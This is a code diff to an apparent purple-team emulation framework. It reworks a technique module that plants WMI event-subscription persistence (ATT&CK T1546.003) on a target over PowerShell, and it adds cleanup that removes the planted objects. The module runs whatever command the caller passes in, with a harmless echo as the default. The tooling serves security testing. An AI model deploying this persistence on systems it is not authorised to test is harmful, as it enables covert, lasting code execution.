@@ -2,11 +2,14 @@ from __future__ import annotations
 
 import logging
 from typing import Any
+from uuid import uuid4
 
 from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
-from purplestrike.techniques.connection import TargetConnection, get_connection
+from purplestrike.techniques.connection import TargetConnection, command_error, get_connection
+from purplestrike.techniques.scripts import ps_quote
 
 logger = logging.getLogger(__name__)
+_subscriptions: dict[str, tuple[str, str]] = {}
 
 
 async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
@@ -14,28 +17,26 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
     conn: TargetConnection | None = None
     try:
         conn = await get_connection(target)
-        event_query = parameters.get("event_query", "")
-        command = parameters.get("command", "")
-        filter_cmd = (
-            f"Set-WmiInstance -Class __EventFilter -Arguments "
-            "{{Name='PurpleStrikeFilter'; EventNameSpace='root\\cimv2'; "
-            f"QueryLanguage='WQL'; Query='{event_query}'}}"
+        event_query = parameters.get("event_query") or (
+            "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"
         )
-        await conn.run_ps(filter_cmd)
-        consumer_cmd = (
-            f"Set-WmiInstance -Class CommandLineEventConsumer -Arguments "
-            "{{Name='PurpleStrikeConsumer'; "
-            f"CommandLineTemplate='{command}'}}"
+        command = parameters.get("command") or "cmd.exe /c echo PurpleStrike"
+        token = uuid4().hex[:10]
+        filter_name = f"PurpleStrikeFilter_{token}"
+        consumer_name = f"PurpleStrikeConsumer_{token}"
+        _subscriptions[target] = (filter_name, consumer_name)
+        result = await conn.run_ps(
+            "$ErrorActionPreference = 'Stop'; "
+            "$f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter "
+            f"-Arguments @{{Name={ps_quote(filter_name)}; EventNamespace='root/cimv2'; "
+            f"QueryLanguage='WQL'; Query={ps_quote(event_query)}}}; "
+            "$c = Set-WmiInstance -Namespace root/subscription "
+            "-Class CommandLineEventConsumer "
+            f"-Arguments @{{Name={ps_quote(consumer_name)}; "
+            f"CommandLineTemplate={ps_quote(command)}}}; "
+            "Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding "
+            "-Arguments @{Filter=$f; Consumer=$c}"
         )
-        await conn.run_ps(consumer_cmd)
-        binding_cmd = (
-            "Set-WmiInstance -Class __FilterToConsumerBinding -Arguments "
-            "{{Filter=(Get-WmiObject __EventFilter -Filter "
-            "\"Name='PurpleStrikeFilter'\"); "
-            "Consumer=(Get-WmiObject CommandLineEventConsumer -Filter "
-            "\"Name='PurpleStrikeConsumer'\")}}"
-        )
-        result = await conn.run_ps(binding_cmd)
         return TechniqueResult(
             technique_id="T1546.003",
             success=result.success,
@@ -60,19 +61,28 @@ async def cleanup(target: str) -> None:
     """Reverse any changes made during execution."""
     conn: TargetConnection | None = None
     try:
+        names = _subscriptions.get(target)
+        if names is None:
+            return
+        filter_name, consumer_name = names
         conn = await get_connection(target)
-        await conn.run_ps(
-            "Get-WmiObject __FilterToConsumerBinding -Filter "
-            "\"Filter.Name='PurpleStrikeFilter'\" | Remove-WmiObject"
+        result = await conn.run_ps(
+            "Get-WmiObject -Namespace root\\subscription "
+            "-Class __FilterToConsumerBinding | "
+            f"Where-Object {{ $_.Filter -like '*Name=\"{filter_name}\"*' }} "
+            "| Remove-WmiObject; "
+            "Get-WmiObject -Namespace root\\subscription "
+            "-Class CommandLineEventConsumer -Filter "
+            f"\"Name='{consumer_name}'\" "
+            "| Remove-WmiObject; "
+            "Get-WmiObject -Namespace root\\subscription "
+            "-Class __EventFilter -Filter "
+            f"\"Name='{filter_name}'\" "
+            "| Remove-WmiObject"
         )
-        await conn.run_ps(
-            "Get-WmiObject CommandLineEventConsumer -Filter "
-            "\"Name='PurpleStrikeConsumer'\" | Remove-WmiObject"
-        )
-        await conn.run_ps(
-            "Get-WmiObject __EventFilter -Filter "
-            "\"Name='PurpleStrikeFilter'\" | Remove-WmiObject"
-        )
+        if not result.success:
+            raise RuntimeError(command_error(result))
+        _subscriptions.pop(target, None)
     except Exception as e:
         logger.warning(f"T1546.003 cleanup failed: {e}")
     finally:
